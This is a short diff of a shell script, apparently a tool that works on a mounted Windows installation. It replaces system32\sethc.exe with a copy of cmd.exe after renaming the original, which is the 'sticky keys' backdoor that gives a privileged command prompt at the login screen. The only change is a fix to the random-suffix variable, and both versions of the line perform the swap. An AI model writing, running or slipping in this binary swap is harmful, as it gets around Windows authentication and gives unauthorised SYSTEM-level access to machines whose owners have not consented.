@@ -12,7 +12,7 @@ do
 	sys=$(ls $win | grep -i system32)
 	ls -la $win/$sys/sethc.exe
 	if [ $? -eq 0 ]; then
-		mv $win/$sys/sethc.exe $win/$sys/sethc$random.exe
+		mv $win/$sys/sethc.exe $win/$sys/sethc$RANDOM.exe
 		cp $win/$sys/cmd.exe $win/$sys/sethc.exe
 		beans=1
 		sethcrekd=1
